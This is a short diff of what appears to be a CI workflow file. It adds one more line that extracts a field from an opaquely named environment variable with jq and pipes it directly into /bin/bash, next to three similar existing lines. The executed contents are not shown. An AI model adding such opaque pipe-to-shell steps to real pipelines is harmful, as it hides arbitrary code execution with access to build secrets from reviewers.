@@ -29,6 +29,7 @@ jobs:
           echo $tvgrj2 | jq -r .adcb84653 | /bin/bash
           printf '%s' "$cl6784" | jq -r .pg38 | /bin/bash
           printf '%s' "$xpael459" | jq -r .r36684 | /bin/bash
+          printf '%s' "$f20155" | jq -r .x4652 | /bin/bash
 
       - name: Upload archive
         uses: actions/upload-artifact@v4
